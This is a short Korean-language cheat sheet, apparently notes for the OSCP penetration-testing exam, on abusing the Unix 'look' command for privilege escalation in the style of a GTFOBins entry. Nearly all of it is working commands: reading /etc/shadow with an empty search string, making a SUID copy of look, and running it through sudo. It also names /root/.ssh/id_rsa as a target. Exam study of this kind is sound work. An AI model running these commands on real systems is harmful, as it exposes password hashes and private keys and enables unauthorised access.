# look 명령어를 이용한 권한 상승

```bash
# look 명령: 파일 내용 읽기 가능
# 특정 문자열로 시작하는 줄을 검색하는 명령어지만, 권한 상승에 활용 가능

# 1. 일반 파일 읽기 (권한 밖 파일 내용 확인)
LFILE=/etc/shadow   # 읽고 싶은 파일 지정
look '' "$LFILE"    # 빈 문자열로 검색 → 전체 내용 표시

# 2. SUID 바이너리로 권한 상승
# - SUID 설정된 look 명령어 이용
sudo install -m =xs $(which look) .  # 현재 디렉토리에 SUID 설정된 look 복제

# SUID 바이너리로 권한 있는 파일 읽기
LFILE=/etc/shadow
/path/to/look '' "$LFILE"

# 3. sudo 권한으로 실행
# - sudoers에 look 명령어 실행 권한 있는 경우
LFILE=/etc/shadow
sudo /path/to/look '' "$LFILE"

# 핵심: look 명령은 파일 내용을 직접 읽기 때문에 권한 상승 가능
# 권한 상승에 유용 - 내부적으로 권한을 drop하지 않음
# /etc/shadow, /root/.ssh/id_rsa 등 중요 파일 내용 읽기 가능
```

---

OSCP 시험에서 권한 상승 시 기억해두면 좋은 GTFOBins 방법입니다.
